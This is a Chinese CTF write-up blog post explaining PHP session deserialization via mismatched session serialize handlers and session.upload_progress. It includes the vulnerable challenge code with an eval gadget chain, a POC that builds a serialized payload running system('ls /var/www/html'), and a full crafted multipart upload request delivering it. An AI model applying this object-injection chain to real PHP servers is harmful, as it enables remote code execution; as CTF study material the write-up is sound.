---
draft: false
date: 2018-07-23 00:09:17
title: 关于 PHP SESSION 反序列化
description: 基于第三届 4.29 “安恒杯”网络安全技术大赛初赛中的题，第三个 web 题，php 反序列化漏洞
categories:
  - Pentest
tags:
  - php
  - 反序列化
---


### 0x00 环境
公司出了一些ctf，说要摸底，然后根据答题成绩来分配相应工作。。。。。 

其中有一道是php反序列化，直接用的就是 第三届4.29“安恒杯”网络安全技术大赛初赛第三个web题

我比较菜，这里根据网上已有writeup做了一遍，这里记录一下。。。。

```ini
reber@wyb:~$ html cat /proc/version
Linux version 4.4.0-31-generic (buildd@lgw01-43) (gcc version 4.8.4 (Ubuntu 4.8.4-2ubuntu1~14.04.3) ) #50~14.04.1-Ubuntu SMP Wed Jul 13 01:07:32 UTC 2016

reber@wyb:~$ html php --version
PHP 5.5.9-1ubuntu4.21 (cli) (built: Feb  9 2017 20:54:58)
Copyright (c) 1997-2014 The PHP Group
Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies
    with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies

reber@ubuntu-linux:~$ apachectl -v
Server version: Apache/2.4.7 (Ubuntu)
Server built:   Jul 15 2016 15:34:04
```

```
#php.ini部分相关配置
session.auto_start=Off
session.serialize_handler=php_serialize
session.upload_progress.cleanup=Off
session.upload_progress.enabled=On
```

### 0x01 PHP Session 序列化及反序列化处理器

php在session存储和读取时,都会有一个序列化和反序列化的过程，反序列化中会调用对象的magic方法,比如```__destruct(),__wakeup()```等

PHP 内置了多种处理器用于存取 $_SESSION 数据，都会对数据进行序列化和反序列化，这几种处理器如下：
```
---------------------------------------------------------------------------------------------
处理器                      |对应的存储格式
---------------------------------------------------------------------------------------------
php                        |键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值
php_binary                 |键名的长度对应的ASCII字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值
php_serialize (php>=5.5.4) |经过 serialize() 函数反序列处理的数组
---------------------------------------------------------------------------------------------
```

一般来说当你访问一个网站时若浏览器Cookie中生成 PHPSESSID=02jhnntphc2sg87i03kvv99425;，则服务器会生成名字类似于sess_02jhnntphc2sg87i03kvv99425的对应session文件，里面存的就是session信息

比如```http://10.11.11.11/test.php```有如下代码：
```
<?php
    session_start();
    $name = $_GET['name'];
    $passwd = $_GET['passwd'];
    $_SESSION['name'] = $name;
    $_SESSION['passwd'] = $passwd;
?>
```
当你访问```10.11.11.11/test.php?name=xiaoming&passwd=123456```时，使用不同处理器时session文件就会存入相应格式的序列化字符串：
```diff
---------------------------------------------------------------------------------------
处理器                      |对应存储的序列化字符串
---------------------------------------------------------------------------------------
php                        |name|s:8:"xiaoming";passwd|s:6:"123456";
php_binary                 |names:8:"xiaoming";passwds:6:"123456";
php_serialize (php>=5.5.4) |a:2:{s:4:"name";s:8:"xiaoming";s:6:"passwd";s:6:"123456";}
---------------------------------------------------------------------------------------
```

如果 PHP 在反序列化存储的 SESSION 数据时使用的处理器和序列化时使用的处理器不同，可能会导致数据无法正确反序列化，经过构造甚至可以执行代码

### 0x02 相关文件
一共有三个文件：

* class.php

```
<?php

highlight_string(file_get_contents(basename($_SERVER['PHP_SELF'])));
//show_source(__FILE__);

class foo1{
    public $varr;
    function __construct(){
        $this->varr = "index.php";
    }
    function __destruct(){
        if(file_exists($this->varr)){
            echo "<br>文件".$this->varr."存在<br>";
        }
        echo "<br>这是foo1的析构函数<br>";
    }
}

class foo2{
    public $varr;
    public $obj;
    function __construct(){
        $this->varr = '1234567890';
        $this->obj = null;
    }
    function __toString(){
        $this->obj->execute();
        return $this->varr;
    }
    function __desctuct(){
        echo "<br>这是foo2的析构函数<br>";
    }
}

class foo3{
    public $varr;
    function execute(){
        eval($this->varr);
    }
    function __desctuct(){
        echo "<br>这是foo3的析构函数<br>";
    }
}

?>
```

* index.php

```
<?php
    ini_set('session.serialize_handler', 'php');
    //服务器反序列化使用的处理器是php_serialize，而这里使用了php，所以会出现安全问题
    require("./class.php");
    session_start();

    $obj = new foo1();
    $obj->varr = "phpinfo.php";
?>
```

* phpinfo.php

```
<?php
    session_start();
    require("./class.php");

    $f3 = new foo3();
    $f3->varr = "phpinfo();";
    $f3->execute();
?>
```

### 0x03 解题思路
先说下session.upload_progress.enabled，当它为开启状态时，PHP能够在每一个文件上传时监测上传进度。

当一个上传在处理中，同时POST一个与php.ini中设置的session.upload_progress.name同名变量时，上传进度就可以在$_SESSION中获得。

当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是session.upload_progress.prefix与 session.upload_progress.name连接在一起的值。



假如说正常服务器php使用的是php_serialize处理器时，若post：name=xiaoming&passwd=123456|aaaaaaaaa，

则session中存的就是```a:2:{s:4:"name";s:8:"xiaoming";s:6:"passwd";s:16:"123456|aaaaaaaaa";}```，若还用php_serialize读取数据的话还能读取到正常数据

但若以php处理器读取时得到的就是键为```a:2:{s:4:"name";s:8:"xiaoming";s:6:"passwd";s:16:"123456```，

值为`|`后面的序列化字符串反序列化后的数据(因为php处理器存储的格式是：键名|反序列后的值)



当前代码的话没有向服务器提交数据，但是现在session.upload_progress.enabled是开启的，所以可以通过上传文件，从而在session文件中写入数据



* POC

```
<?php
class foo3{
    public $varr;
    function __construct(){
        $this->varr = 'system(\'ls /var/www/html\');';
    }
}
 
class foo2{
    public $varr;
    public $obj;
    function __construct(){
        $this->varr = '1';
        $this->obj = new foo3();
    }
}
 
class foo1{
    public $varr;
    function __construct(){
        $this->varr = new foo2();
    }
}
 
echo serialize(new foo1());
?>
```

* 上传表单

这里的action只要是服务器上代码中有session_start()的php文件即可

```
<form action="http://192.168.3.136/index.php" method="POST" enctype="multipart/form-data">        
    <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="123" />        
    <input type="file" name="file" />        
    <input type="submit" />
</form>
```

### 0x04 利用
* 首先利用poc生成序列化的payload

```
O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:1:"1";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:27:"system('ls /var/www/html');";}}}
```

* 通过上面的表单上传文件时抓包改包如下

```
POST /phpinfo.php HTTP/1.1
Host: 10.11.11.11
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Referer: http://127.0.0.1/upload.html
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------1971979777391321181548092978
Content-Length: 489

-----------------------------1971979777391321181548092978
Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"

123|O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:1:"1";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:27:"system('ls /var/www/html');";}}} 
-----------------------------1971979777391321181548092978
Content-Disposition: form-data; name="file"; filename="tmp.txt"
Content-Type: text/plain

abcdefg
-----------------------------1971979777391321181548092978--
```
![](/img/post/php-session-unserialize-1.png)

请求后服务器上生成的session文件sess_6oa2pegcmlejjvhr4t68ric5l5的内容为：
```
a:1:{s:152:"upload_progress_123|O:4:"foo1":1:{s:4:"varr";O:4:"foo2":2:{s:4:"varr";s:1:"1";s:3:"obj";O:4:"foo3":1:{s:4:"varr";s:27:"system('ls /var/www/html');";}}}
```

* 改包重新访问从而执行代码

![](/img/post/php-session-unserialize-2.png)

* 然后更改poc中的payload生成新的序列化字符串，重复上述操作即可得到flag



#### Reference(侵删)：
* [PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患](http://drops.wooyun.org/tips/3909?_blank)
* [安恒429|web 3 session反序列化](https://www.tuicool.com/articles/BfuayyI?_blank)
* [有趣的php反序列化总结](http://www.mottoin.com/18436.html?_blank)


